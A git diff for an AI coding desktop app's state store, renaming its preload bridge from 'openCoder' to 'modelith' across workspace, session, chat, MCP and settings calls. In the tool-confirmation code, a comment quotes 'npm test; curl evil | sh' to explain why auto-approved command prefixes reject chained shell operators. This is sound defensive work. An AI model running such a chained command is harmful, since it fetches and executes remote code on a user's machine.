@@ -276,9 +276,9 @@ export const useAppStore = create<AppState>((set, get) => ({
 
   async initWorkspace() {
     try {
-      const root = await window.openCoder.workspace.current()
+      const root = await window.modelith.workspace.current()
       if (!root) return
-      const tree = await window.openCoder.workspace.tree()
+      const tree = await window.modelith.workspace.tree()
       set({ workspaceRoot: root, workspaceTree: tree })
     } catch (err) {
       set({ error: toProviderError(err) })
@@ -287,9 +287,9 @@ export const useAppStore = create<AppState>((set, get) => ({
 
   async pickWorkspace() {
     try {
-      const root = await window.openCoder.workspace.pick()
+      const root = await window.modelith.workspace.pick()
       if (!root) return
-      const tree = await window.openCoder.workspace.tree()
+      const tree = await window.modelith.workspace.tree()
       set({ workspaceRoot: root, workspaceTree: tree, workspaceOpen: true })
     } catch (err) {
       set({ error: toProviderError(err) })
@@ -305,7 +305,7 @@ export const useAppStore = create<AppState>((set, get) => ({
     const edit = get().pendingEdit
     if (!edit) return
     set({ pendingEdit: null })
-    void window.openCoder.chat.toolDecision(edit.callId, action, content)
+    void window.modelith.chat.toolDecision(edit.callId, action, content)
   },
   resolveConfirm(action, allowSession) {
     const confirm = get().pendingConfirm
@@ -314,7 +314,7 @@ export const useAppStore = create<AppState>((set, get) => ({
       pendingConfirm: null,
       allowedTools: allowSession && action === 'accept' ? [...new Set([...s.allowedTools, confirm.name])] : s.allowedTools,
     }))
-    void window.openCoder.chat.toolDecision(confirm.callId, action)
+    void window.modelith.chat.toolDecision(confirm.callId, action)
   },
   allowCommandPrefix(prefix) {
     const confirm = get().pendingConfirm
@@ -323,11 +323,11 @@ export const useAppStore = create<AppState>((set, get) => ({
       pendingConfirm: null,
       allowedCommandPrefixes: [...new Set([...s.allowedCommandPrefixes, prefix])],
     }))
-    void window.openCoder.chat.toolDecision(confirm.callId, 'accept')
+    void window.modelith.chat.toolDecision(confirm.callId, 'accept')
   },
   async revertEdits(turnId) {
     try {
-      await window.openCoder.workspace.revert(turnId)
+      await window.modelith.workspace.revert(turnId)
       set({ lastEditTurnId: null })
     } catch (err) {
       set({ error: toProviderError(err) })
@@ -340,11 +340,11 @@ export const useAppStore = create<AppState>((set, get) => ({
     if (next) void get().refreshGit()
   },
   async refreshGit() {
-    try { set({ gitStatus: await window.openCoder.git.status(), gitDiff: '' }) }
+    try { set({ gitStatus: await window.modelith.git.status(), gitDiff: '' }) }
     catch (err) { set({ error: toProviderError(err) }) }
   },
   async showGitDiff(path) {
-    try { set({ gitDiff: await window.openCoder.git.diff(path) }) }
+    try { set({ gitDiff: await window.modelith.git.diff(path) }) }
     catch (err) { set({ error: toProviderError(err) }) }
   },
   toggleRaceBar() { set((s) => ({ raceOpen: !s.raceOpen })) },
@@ -372,7 +372,7 @@ export const useAppStore = create<AppState>((set, get) => ({
       },
     }))
     try {
-      const { raceId } = await window.openCoder.chat.startRace({ sessionId, content, entries })
+      const { raceId } = await window.modelith.chat.startRace({ sessionId, content, entries })
       set((s) => (s.race ? { race: { ...s.race, raceId } } : {}))
     } catch (err) {
       set({ error: toProviderError(err), race: null })
@@ -383,7 +383,7 @@ export const useAppStore = create<AppState>((set, get) => ({
     const race = get().race
     if (!race || race.raceId === 'pending') return
     try {
-      await window.openCoder.chat.chooseWinner(race.raceId, columnId)
+      await window.modelith.chat.chooseWinner(race.raceId, columnId)
       set({ race: null })
       await get().refreshMessages()
     } catch (err) {
@@ -394,24 +394,24 @@ export const useAppStore = create<AppState>((set, get) => ({
   async abortRace() {
     const race = get().race
     if (!race) return
-    try { if (race.raceId !== 'pending') await window.openCoder.chat.abort(race.raceId) }
+    try { if (race.raceId !== 'pending') await window.modelith.chat.abort(race.raceId) }
     catch { /* discard regardless */ }
     set({ race: null })
   },
   async loadMcpServers() {
-    try { set({ mcpServers: await window.openCoder.mcp.list() }) }
+    try { set({ mcpServers: await window.modelith.mcp.list() }) }
     catch (err) { set({ error: toProviderError(err) }) }
   },
   async addMcpServer(config) {
-    try { set({ mcpServers: await window.openCoder.mcp.add(config) }) }
+    try { set({ mcpServers: await window.modelith.mcp.add(config) }) }
     catch (err) { set({ error: toProviderError(err) }) }
   },
   async removeMcpServer(id) {
-    try { set({ mcpServers: await window.openCoder.mcp.remove(id) }) }
+    try { set({ mcpServers: await window.modelith.mcp.remove(id) }) }
     catch (err) { set({ error: toProviderError(err) }) }
   },
   async setMcpEnabled(id, enabled) {
-    try { set({ mcpServers: await window.openCoder.mcp.setEnabled(id, enabled) }) }
+    try { set({ mcpServers: await window.modelith.mcp.setEnabled(id, enabled) }) }
     catch (err) { set({ error: toProviderError(err) }) }
   },
   setCanvasSelection(outerHTML) { set({ canvasSelection: outerHTML }) },
@@ -454,7 +454,7 @@ export const useAppStore = create<AppState>((set, get) => ({
 
   async loadPlatform() {
     try {
-      const info = await window.openCoder.appInfo()
+      const info = await window.modelith.appInfo()
       set({ platform: info.platform })
     } catch (err) {
       set({ error: toProviderError(err) })
@@ -463,7 +463,7 @@ export const useAppStore = create<AppState>((set, get) => ({
 
   async loadSettings() {
     try {
-      const settings = await window.openCoder.settings.get()
+      const settings = await window.modelith.settings.get()
       const fallbacks = settings['fallbacks']
       if (Array.isArray(fallbacks)) set({ fallbacks: fallbacks as Fallback[] })
       const modes = settings['modes']
@@ -476,7 +476,7 @@ export const useAppStore = create<AppState>((set, get) => ({
   async setFallbacks(fallbacks) {
     set({ fallbacks })
     try {
-      await window.openCoder.settings.set({ fallbacks })
+      await window.modelith.settings.set({ fallbacks })
     } catch (err) {
       set({ error: toProviderError(err) })
     }
@@ -488,7 +488,7 @@ export const useAppStore = create<AppState>((set, get) => ({
       : [...get().modes, mode]
     set({ modes })
     try {
-      await window.openCoder.settings.set({ modes })
+      await window.modelith.settings.set({ modes })
     } catch (err) {
       set({ error: toProviderError(err) })
     }
@@ -498,7 +498,7 @@ export const useAppStore = create<AppState>((set, get) => ({
     const modes = get().modes.filter((m) => m.id !== id)
     set({ modes, activeModeId: get().activeModeId === id ? null : get().activeModeId })
     try {
-      await window.openCoder.settings.set({ modes })
+      await window.modelith.settings.set({ modes })
     } catch (err) {
       set({ error: toProviderError(err) })
     }
@@ -517,7 +517,7 @@ export const useAppStore = create<AppState>((set, get) => ({
   async togglePin(id) {
     const current = get().sessions.find((s) => s.id === id)?.pinned ?? false
     try {
-      await window.openCoder.sessions.setPinned(id, !current)
+      await window.modelith.sessions.setPinned(id, !current)
       await get().loadSessions()
     } catch (err) {
       set({ error: toProviderError(err) })
@@ -527,7 +527,7 @@ export const useAppStore = create<AppState>((set, get) => ({
   async toggleArchive(id) {
     const current = get().sessions.find((s) => s.id === id)?.archived ?? false
     try {
-      await window.openCoder.sessions.setArchived(id, !current)
+      await window.modelith.sessions.setArchived(id, !current)
       await get().loadSessions()
     } catch (err) {
       set({ error: toProviderError(err) })
@@ -536,7 +536,7 @@ export const useAppStore = create<AppState>((set, get) => ({
 
   async setSessionTags(id, tags) {
     try {
-      await window.openCoder.sessions.setTags(id, tags)
+      await window.modelith.sessions.setTags(id, tags)
       await get().loadSessions()
     } catch (err) {
       set({ error: toProviderError(err) })
@@ -550,7 +550,7 @@ export const useAppStore = create<AppState>((set, get) => ({
     const id = get().activeSessionId
     if (!id) return
     try {
-      set({ messages: await window.openCoder.sessions.load(id) })
+      set({ messages: await window.modelith.sessions.load(id) })
     } catch {
       // A refresh failure is non-fatal — the optimistic messages remain shown.
     }
@@ -560,7 +560,7 @@ export const useAppStore = create<AppState>((set, get) => ({
     const sourceId = get().activeSessionId
     if (!sourceId) return
     try {
-      const { id } = await window.openCoder.sessions.branch(sourceId, messageId, 'Fork')
+      const { id } = await window.modelith.sessions.branch(sourceId, messageId, 'Fork')
       await get().loadSessions()
       await get().selectSession(id)
     } catch (err) {
@@ -574,8 +574,8 @@ export const useAppStore = create<AppState>((set, get) => ({
     const sessionId = get().activeSessionId
     if (!sessionId) return
     try {
-      await window.openCoder.sessions.truncateFrom(sessionId, messageId)
-      set({ messages: await window.openCoder.sessions.load(sessionId) })
+      await window.modelith.sessions.truncateFrom(sessionId, messageId)
+      set({ messages: await window.modelith.sessions.load(sessionId) })
       await get().send(content)
     } catch (err) {
       set({ error: toProviderError(err) })
@@ -588,8 +588,8 @@ export const useAppStore = create<AppState>((set, get) => ({
     const sessionId = get().activeSessionId
     if (!sessionId) return
     try {
-      await window.openCoder.sessions.editMessage(sessionId, messageId, content)
-      set({ messages: await window.openCoder.sessions.load(sessionId) })
+      await window.modelith.sessions.editMessage(sessionId, messageId, content)
+      set({ messages: await window.modelith.sessions.load(sessionId) })
     } catch (err) {
       set({ error: toProviderError(err) })
     }
@@ -599,7 +599,7 @@ export const useAppStore = create<AppState>((set, get) => ({
     const trimmed = title.trim()
     if (!trimmed) return
     try {
-      await window.openCoder.sessions.rename(id, trimmed)
+      await window.modelith.sessions.rename(id, trimmed)
       await get().loadSessions()
     } catch (err) {
       set({ error: toProviderError(err) })
@@ -611,7 +611,7 @@ export const useAppStore = create<AppState>((set, get) => ({
   // conversation that no longer exists.
   async deleteSession(id) {
     try {
-      await window.openCoder.sessions.delete(id)
+      await window.modelith.sessions.delete(id)
       if (get().activeSessionId === id) {
         set({ activeSessionId: null, messages: [], error: null })
       }
@@ -623,7 +623,7 @@ export const useAppStore = create<AppState>((set, get) => ({
 
   async loadSessions() {
     try {
-      set({ sessions: await window.openCoder.sessions.list() })
+      set({ sessions: await window.modelith.sessions.list() })
     } catch (err) {
       set({ error: toProviderError(err) })
     }
@@ -631,18 +631,18 @@ export const useAppStore = create<AppState>((set, get) => ({
 
   // Selects the first provider (and its first model) only when nothing is
   // chosen yet, or the current selection no longer exists. This is what lets
-  // the E2E fake provider (registered first under OPEN_CODER_FAKE_PROVIDER)
+  // the E2E fake provider (registered first under MODELITH_FAKE_PROVIDER)
   // become the active selection with no test-only code in the renderer.
   async loadProviders() {
     try {
-      const list = await window.openCoder.providers.list()
+      const list = await window.modelith.providers.list()
       set({ providers: list })
       const current = get().providerId
       if (!current || !list.some((p) => p.id === current)) {
         const first = list[0]
         if (!first) return
         set({ providerId: first.id })
-        const models = await window.openCoder.providers.models(first.id).catch(() => [])
+        const models = await window.modelith.providers.models(first.id).catch(() => [])
         if (models[0]) set({ model: models[0].id })
       }
     } catch (err) {
@@ -662,7 +662,7 @@ export const useAppStore = create<AppState>((set, get) => ({
   // user is looking at.
   async selectSession(id) {
     try {
-      const messages = await window.openCoder.sessions.load(id)
+      const messages = await window.modelith.sessions.load(id)
       // Per-turn/per-session UI state must not bleed into the newly-opened
       // session: the revert affordance and any canvas selection belong to the
       // session that produced them.
@@ -674,7 +674,7 @@ export const useAppStore = create<AppState>((set, get) => ({
 
   async newSession() {
     try {
-      const { id } = await window.openCoder.sessions.create('New chat')
+      const { id } = await window.modelith.sessions.create('New chat')
       await get().loadSessions()
       await get().selectSession(id)
     } catch (err) {
@@ -727,7 +727,7 @@ export const useAppStore = create<AppState>((set, get) => ({
         (f) => !(f.providerId === get().providerId && f.model === get().model),
       )
       const mode = get().modes.find((m) => m.id === get().activeModeId)
-      const { streamId } = await window.openCoder.chat.send({
+      const { streamId } = await window.modelith.chat.send({
         sessionId,
         providerId: get().providerId,
         model: get().model,
@@ -751,7 +751,7 @@ export const useAppStore = create<AppState>((set, get) => ({
   async stop() {
     const id = get().streamId
     try {
-      if (id) await window.openCoder.chat.abort(id)
+      if (id) await window.modelith.chat.abort(id)
     } catch (err) {
       set({ error: toProviderError(err) })
     } finally {
@@ -864,11 +864,11 @@ export const useAppStore = create<AppState>((set, get) => ({
         // Auto-run only a clean prefix match with no shell operators — an
         // allowed "npm test" must not silently run "npm test; curl evil | sh".
         if (commandMatchesAllowedPrefix(command, get().allowedCommandPrefixes)) {
-          void window.openCoder.chat.toolDecision(event.callId, 'accept')
+          void window.modelith.chat.toolDecision(event.callId, 'accept')
           return
         }
       } else if (get().allowedTools.includes(event.name)) {
-        void window.openCoder.chat.toolDecision(event.callId, 'accept')
+        void window.modelith.chat.toolDecision(event.callId, 'accept')
         return
       }
       if (sessionId === get().activeSessionId) {
